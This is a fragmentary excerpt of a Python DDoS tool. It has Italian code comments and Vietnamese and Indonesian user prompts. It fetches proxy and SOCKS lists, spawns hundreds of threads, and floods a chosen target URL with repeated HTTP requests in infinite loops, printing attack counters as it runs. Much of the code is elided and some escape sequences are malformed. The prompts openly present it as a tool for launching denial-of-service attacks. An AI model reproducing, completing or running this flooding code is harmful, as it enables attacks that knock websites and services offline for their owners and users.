...
def starturl(): # in questa funzione setto l'url per renderlo usabile per il futuro settaggio delle richieste HTTP.
	...
	if choice1 == "1":
		ip_file = input("Nhập file txt sock bạn vừa tải ==> ")
...
def proxymode():
	global choice2
	choice2 = input("Nhập y nếu chọn đế độ ddos bằng HTTP/SOCK: ")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()
...
def choiceproxysocks():
	global choice3
	choice3 = input("Chọn chế độ ddos proxy vip pro[0] hoặc bình thường[1]: ")
	if choice3 == "0":
		choicedownproxy()
	elif choice3 == "1":
		choicedownsocks()
...
def choicedownproxy():
	choice4 = input("Bạn có muốn tải file proxy ấn y để tải: ")
	if choice4 == "y":
...
def proxyget(urlproxy): # lo dice il nome, questa funzione scarica i proxies
	try:
		...
		out_file.close()
		print ("Proxies Tải thành Công lưu tại dowload tên proxy.txt.")
...
def proxylist():
	global proxies
	out_file = str(input("Nhập file proxy  (proxy.txt): "))
	if out_file == "":
		out_file = "proxy.txt"
...
def numthreads():
	global threads
	try:
		threads = int(input("Kiểm tra proxy  (800): "))
	except ValueError:
		threads = 800
...
def multiplication():
	global multiple
	try:
		multiple = int(input("Chế độ kiểm tra [(1-5=Nhanh)(50=trung bình)(100 chậm)]: "))
	except ValueError: 
		print("Anda salah ketik, coba lagi.\n")
		multiplication()
	begin()
...
def begin():
	choice6 = input("Ấn'Enter' để tiến hành ddos : ")
	if choice6 == "":
		loop()
	...
	if choice2 == "y": # se abbiamo scelto la modalita' proxying
		if choice3 == "0": # e abbiamo scelto gli HTTP proxy
			for x in range(threads):
				...
				print ("\033[94m Thread \033[0m" + str(x) + " ready!")
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True: # ciclo infinito
			try:
				...
				print ("\033[92m Byte được gửi đi bởi proxy \033[0m" + str(proxy[0]+":"+proxy[1]) + "\033[91m Số byte gửi đi \033[0m", self.counter) # print delle richieste
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				print ("\033[92m Gửi đi bởi proxy\033[0m" + str(proxy[0]+":"+proxy[1]) + "\033[91m Số byte gửi đi \033[0m", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
				...
				try: # il try prova a vedere se l'errore e' causato dalla tipologia di socks errata, infatti prova con SOCKS4
					...
					s.connect((str(url2), int(urlport))) # connessione
					s.send (str.encode(request)) # invio
					print ("\033[92m Đăng ký đi\003[0m" + str(proxy[0]+":"+proxy[1]) + "\033[91m Serang! \003[0m", self.counter) # print req + counter
					try: # invia altre richieste nello stesso thread
						for y in range(multiple): # fattore di moltiplicazione
							s.send(str.encode(request)) # encode in bytes della richiesta HTTP
					except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
					...
					print ("\033[91m Mệt đéo muốn code nữa\003[0m", self.counter)
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				s.connect((str(url2), int(urlport))) # connessione
				s.send (str.encode(request)) # invio
				print ("\033[93m Serangan Dikirimkan!!! \033[0m", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
